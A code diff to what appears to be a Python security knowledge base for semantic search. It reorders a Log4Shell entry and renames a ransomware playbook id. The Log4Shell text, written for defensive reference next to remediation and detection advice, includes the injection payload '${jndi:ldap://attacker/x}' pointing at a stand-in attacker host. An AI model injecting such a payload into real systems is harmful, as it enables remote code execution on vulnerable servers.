@@ -21,15 +21,6 @@ from sentence_transformers import SentenceTransformer
 
 KNOWLEDGE_BASE = [
     {
-        "id": "log4shell",
-        "title": "CVE-2021-44228 Log4Shell",
-        "text": (
-            "Critical RCE in Apache Log4j2. Attack vector: inject ${jndi:ldap://attacker/x} "
-            "into any logged field. No authentication required. Remediation: upgrade to 2.17.1+. "
-            "Detection: outbound LDAP from app servers, jndi patterns in HTTP headers and User-Agent."
-        ),
-    },
-    {
         "id": "mimikatz",
         "title": "Mimikatz Credential Theft",
         "text": (
@@ -40,7 +31,16 @@ KNOWLEDGE_BASE = [
         ),
     },
     {
-        "id": "ransomware_response",
+        "id": "log4shell",
+        "title": "CVE-2021-44228 Log4Shell",
+        "text": (
+            "Critical RCE in Apache Log4j2. Attack vector: inject ${jndi:ldap://attacker/x} "
+            "into any logged field. No authentication required. Remediation: upgrade to 2.17.1+. "
+            "Detection: outbound LDAP from app servers, jndi patterns in HTTP headers and User-Agent."
+        ),
+    },
+    {
+        "id": "ransomware",
         "title": "Ransomware Incident Response Playbook",
         "text": (
             "Phase 1 (0-30 min): Confirm indicators, identify Patient Zero, assess blast radius. "
